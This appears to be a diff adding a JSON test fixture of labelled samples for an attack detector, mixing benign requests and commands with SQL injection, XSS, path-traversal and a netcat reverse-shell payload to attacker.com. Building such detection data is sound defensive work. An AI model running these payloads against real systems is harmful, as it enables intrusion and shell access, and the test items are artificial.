@@ -1,0 +1,58 @@
+[
+  {
+    "attack_type": "sql_injection",
+    "input_text": "SELECT * FROM users WHERE id = '1' OR '1'='1'",
+    "label": "ATTACK",
+    "severity": "high",
+    "source": "test_data",
+    "timestamp": "2024-01-15T10:30:00Z"
+  },
+  {
+    "input_text": "GET /api/users/123 HTTP/1.1",
+    "label": "BENIGN",
+    "source": "test_data",
+    "timestamp": "2024-01-15T10:31:00Z"
+  },
+  {
+    "attack_type": "xss",
+    "input_text": "<script>alert('xss')</script>",
+    "label": "ATTACK",
+    "severity": "medium",
+    "source": "test_data",
+    "timestamp": "2024-01-15T10:32:00Z"
+  },
+  {
+    "input_text": "POST /login HTTP/1.1\nContent-Type: application/json\n{\"username\": \"john\", \"password\": \"secret123\"}",
+    "label": "BENIGN",
+    "source": "test_data",
+    "timestamp": "2024-01-15T10:33:00Z"
+  },
+  {
+    "attack_type": "path_traversal",
+    "input_text": "../../../../etc/passwd",
+    "label": "ATTACK",
+    "severity": "high",
+    "source": "test_data",
+    "timestamp": "2024-01-15T10:34:00Z"
+  },
+  {
+    "input_text": "ping -c 4 google.com",
+    "label": "BENIGN",
+    "source": "test_data",
+    "timestamp": "2024-01-15T10:35:00Z"
+  },
+  {
+    "attack_type": "command_injection",
+    "input_text": "nc -e /bin/sh attacker.com 4444",
+    "label": "ATTACK",
+    "severity": "critical",
+    "source": "test_data",
+    "timestamp": "2024-01-15T10:36:00Z"
+  },
+  {
+    "input_text": "ls -la /home/user/documents",
+    "label": "BENIGN",
+    "source": "test_data",
+    "timestamp": "2024-01-15T10:37:00Z"
+  }
+]
